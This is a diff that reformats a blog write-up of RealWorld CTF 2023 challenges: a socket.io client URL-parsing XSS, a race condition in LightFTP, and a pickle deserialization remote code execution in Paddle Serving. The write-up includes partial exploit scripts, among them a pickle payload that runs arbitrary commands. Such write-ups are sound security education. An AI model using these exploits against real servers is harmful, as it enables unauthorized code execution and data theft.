@@ -1,14 +1,12 @@
 ---
-title: "RealWorld CTF 2023 Writeup"
-date: "2023-01-19"
+title: 'RealWorld CTF 2023 Writeup'
+date: '2023-01-19'
 tags: ['Writeup', 'Pwn', 'Web']
 draft: false
-summary: "Another writeup for the ReadWorld 2023 CTF. Here are the baby-level and normal-level challenges, but they are actually not easy at all."
+summary: 'Another writeup for the ReadWorld 2023 CTF. Here are the baby-level and normal-level challenges, but they are actually not easy at all.'
 ---
 
 Another writeup for the ReadWorld 2023 CTF. Here are the baby-level and normal-level challenges, but they are actually not easy at all.
-
-
 
 All the challenges can be found here: https://github.com/chaitin/Real-World-CTF-5th-Challenges
 
@@ -23,7 +21,7 @@ All the challenges can be found here: https://github.com/chaitin/Real-World-CTF-
 
 #### chatUWU
 
->I can assure you that there is no XSS on the server! You will find the flag in admin's cookie.
+> I can assure you that there is no XSS on the server! You will find the flag in admin's cookie.
 
 This challenge is a `socket.io`-based chat room. As they provided a place to submit a link and request the admin bot to visit, we could suspect that there is an XSS or CSRF vulnerability on the client side.
 
@@ -33,7 +31,7 @@ The logic behind the char room is quite simple and covered by the following code
 
 ![](/static/images/RealWorld-2023-CTF-Writeup/chatUWU-1.png)
 
-We could find that only two parameters are allowed: `nickname` and `room`, and if we set the `room` as `DOMPurify`, the content would be displayed as `item.innerHTML`. Otherwise, our content would be treated as plain text. However, even though our input can be treated as the HTML code, it would be sanitized by the `DOMPurify` function first on the server side. 
+We could find that only two parameters are allowed: `nickname` and `room`, and if we set the `room` as `DOMPurify`, the content would be displayed as `item.innerHTML`. Otherwise, our content would be treated as plain text. However, even though our input can be treated as the HTML code, it would be sanitized by the `DOMPurify` function first on the server side.
 
 **Vulnerable DOMPurify?**
 
@@ -45,16 +43,16 @@ Since we couldn't find an obvious vulnerability in the application layer, we mig
 
 Sometimes, it is hard to find a vulnerability related to parsing or data processing within the complex code base. Fuzz testing on the parameters might always be a good start.
 
-`Radamsa` , claimed as a general-purpose fuzzer, does a great job in generating test data. So we could use this tool to generate arbitrary non-sense input data that might not be correctly handled by the implementation and run into an unintended behavior. Then, we could follow its pattern and custom a dedicated malicious payload for attacking. 
+`Radamsa` , claimed as a general-purpose fuzzer, does a great job in generating test data. So we could use this tool to generate arbitrary non-sense input data that might not be correctly handled by the implementation and run into an unintended behavior. Then, we could follow its pattern and custom a dedicated malicious payload for attacking.
 
 ![](/static/images/RealWorld-2023-CTF-Writeup/chatUWU-2.png)
 
 However, our target code is the client-side code, so we can't leverage the web application fuzzer like `ffuf` which only monitors the response from the server. We need to monitor the browser/client-side code behavior of our input. It sounds difficult to test as well.
 
- ```
+```
 // generate inputs
 echo 'guest' | radamsa -n 10 -o ./fuzz-samples/%n.txt
- ```
+```
 
 **0-day vulnerability within socket.io client: wrong regex parsing**
 
@@ -62,10 +60,10 @@ To be honest, I don't know how other players find out that we could add `@` in t
 
 Here is a quote from the challenge solver:
 
->we were thinking about ways to hijack the connection so we looked at what happens to arguments we can control and saw that the parse function references beeing imported from https://github.com/galkn/parseuri, and that repo has an open issue mentioning a security vuln so we focused our attention on said function
+> we were thinking about ways to hijack the connection so we looked at what happens to arguments we can control and saw that the parse function references beeing imported from https://github.com/galkn/parseuri, and that repo has an open issue mentioning a security vuln so we focused our attention on said function
 >
->I dont think that fuzzing is needed for such a small codebase, and as @[Sauercloud] WhoNeedsSleep already said we had an intuition that tricking the bot into connecting to our server would be neccessary 
->so this line where the url is just passed to socket.io was a good starting point to look for a potential flaw 
+> I dont think that fuzzing is needed for such a small codebase, and as @[Sauercloud] WhoNeedsSleep already said we had an intuition that tricking the bot into connecting to our server would be neccessary
+> so this line where the url is just passed to socket.io was a good starting point to look for a potential flaw
 
 ![](/static/images/RealWorld-2023-CTF-Writeup/chatUWU-3.png)
 
@@ -113,13 +111,11 @@ To sum up, this challenge gives a sight that as attackers, besides considering X
 
 And, on the client side, we also need to debug the code that processes the server response or the client input.
 
-
-
 ### Pwn
 
 #### NonHeavyFTP
 
->A non-heavy FTP for you.
+> A non-heavy FTP for you.
 
 This pwn challenge, labeled as "baby-level," was not as straightforward as anticipated. The provided binary is a version 2.2 of LightFTP, which at the time of the challenge had no known vulnerabilities.
 
@@ -163,56 +159,56 @@ typedef struct _FTPCONTEXT {
 } FTPCONTEXT, *PFTPCONTEXT;
 ```
 
-Due to the out-of-bound transmission nature of the FTP protocol, when handling file-related commands, the server uses another port to send the file or data to the client. The modes for this are "Passive" and "Active," which respectively set up the connection from the client to server and from server to client. In LightFTP's implementation, after validating the file path, the server forks another thread for sending data. 
+Due to the out-of-bound transmission nature of the FTP protocol, when handling file-related commands, the server uses another port to send the file or data to the client. The modes for this are "Passive" and "Active," which respectively set up the connection from the client to server and from server to client. In LightFTP's implementation, after validating the file path, the server forks another thread for sending data.
 
 For example, when handling the "LIST" command, the server first processes and validates the file path, obtains the thread mutex lock, and creates a thread for sending the data.
 
- ```
+```
 int ftpLIST(PFTPCONTEXT context, const char *params)
 {
-    struct	stat	filestats;
-    pthread_t		tid;
+   struct	stat	filestats;
+   pthread_t		tid;
 
-    if (context->Access == FTP_ACCESS_NOT_LOGGED_IN)
-        return sendstring(context, error530);
-    if (context->WorkerThreadValid == 0)
-        return sendstring(context, error550_t);
+   if (context->Access == FTP_ACCESS_NOT_LOGGED_IN)
+       return sendstring(context, error530);
+   if (context->WorkerThreadValid == 0)
+       return sendstring(context, error550_t);
 
-    if (params != NULL)
-    {
-        if ((strcmp(params, "-a") == 0) || (strcmp(params, "-l") == 0))
-            params = NULL;
-    }
+   if (params != NULL)
+   {
+       if ((strcmp(params, "-a") == 0) || (strcmp(params, "-l") == 0))
+           params = NULL;
+   }
 
-    ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);
+   ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);
 
-    sendstring(context, context->FileName);
+   sendstring(context, context->FileName);
 
-    while (stat(context->FileName, &filestats) == 0)
-    {
-        if ( !S_ISDIR(filestats.st_mode) )
-            break;
+   while (stat(context->FileName, &filestats) == 0)
+   {
+       if ( !S_ISDIR(filestats.st_mode) )
+           break;
 
-        sendstring(context, interm150);
-        writelogentry(context, " LIST", (char *)params);
-        context->WorkerThreadAbort = 0;
+       sendstring(context, interm150);
+       writelogentry(context, " LIST", (char *)params);
+       context->WorkerThreadAbort = 0;
 
-        pthread_mutex_lock(&context->MTLock);
+       pthread_mutex_lock(&context->MTLock);
 
-        context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))list_thread, context);
-        if ( context->WorkerThreadValid == 0 )
-            context->WorkerThreadId = tid;
-        else
-            sendstring(context, error451);
+       context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))list_thread, context);
+       if ( context->WorkerThreadValid == 0 )
+           context->WorkerThreadId = tid;
+       else
+           sendstring(context, error451);
 
-        pthread_mutex_unlock(&context->MTLock);
+       pthread_mutex_unlock(&context->MTLock);
 
-        return 1;
-    }
+       return 1;
+   }
 
-    return sendstring(context, error550);
+   return sendstring(context, error550);
 }
- ```
+```
 
 **race condition vulnerability**
 
@@ -271,7 +267,7 @@ def main():
     data_conn = remote(IP, data_port)
     print("[*] Wow! Loook what we received: %s" % data_conn.recv())
 
-    
+
 if __name__ == "__main__":
     main()
 ```
@@ -325,7 +321,7 @@ However, I didn't find a vulnerability during the competition. After the competi
 
 It was discovered that the server used pickle to load bytes from the `request.tensors` field without any sanitization. Pickle is not a secure package and should never be used to unserialize untrusted data.![](/static/images/RealWorld-2023-CTF-Writeup/paddle-2.png)
 
-So, I tried to construct an HTTP request and filled the `tensors field` as our payload, which is something that looks like: 
+So, I tried to construct an HTTP request and filled the `tensors field` as our payload, which is something that looks like:
 
 ```
 my_payload = {
@@ -337,7 +333,7 @@ my_payload = {
 
 But it always returns the `{"error":"json: cannot unmarshal string into Go value of type map[string]json.RawMessage","code":3,"message":"json: cannot unmarshal string into Go value of type map[string]json.RawMessage","details":[]}` error and not even reach to any breakpoint. It took me a lot of time to search online about the correct way to use the `tensors` field, but there is nothing.
 
-Finally, I found that if we add an `{}` outside the `b'xxxxxx'`, then we are able to reach the vulnerable function at least. After adjusting the field from debugging the function, I could write the following exploit. 
+Finally, I found that if we add an `{}` outside the `b'xxxxxx'`, then we are able to reach the vulnerable function at least. After adjusting the field from debugging the function, I could write the following exploit.
 
 ```
 from paddle_serving_server.pipeline import PipelineClient
@@ -354,7 +350,7 @@ def generate_payload(cmd):
             # return os.system, (cmd,)
             import subprocess
             return subprocess.getoutput, (cmd,)
-    
+
     obj = {"x": PickleRCE()}
     payload = pickle.dumps(obj)
     print(payload)
@@ -390,11 +386,11 @@ if __name__ == "__main__":
 
 I also asked one of the very few members who completed this challenge during the competition about how he/she figured out where the vulnerability is and how he/she constructed the attack payload, especially the tensors field part (cause there is no example showing what does the field should look like). Here is the reply:
 
->I just figured it out by reading through paddle's source via exec'ing into the docker container 
+> I just figured it out by reading through paddle's source via exec'ing into the docker container
 >
->I was trying to figure out how the input got transformed to the format in the HTTP request into the format used by `simple_web_service`
+> I was trying to figure out how the input got transformed to the format in the HTTP request into the format used by `simple_web_service`
 >
->And after tracing it backwards for a while I found the part where it parses tensors and noticed the pickle case ¯\_(ツ)_/¯
+> And after tracing it backwards for a while I found the part where it parses tensors and noticed the pickle case ¯\_(ツ)\_/¯
 
 So, what we could learn from this:
 
@@ -403,6 +399,3 @@ So, what we could learn from this:
 3. Always pay attention to the data parsing part, which is more likely to have problems than the main functionality.
 
 #### tinyvm
-
-
-
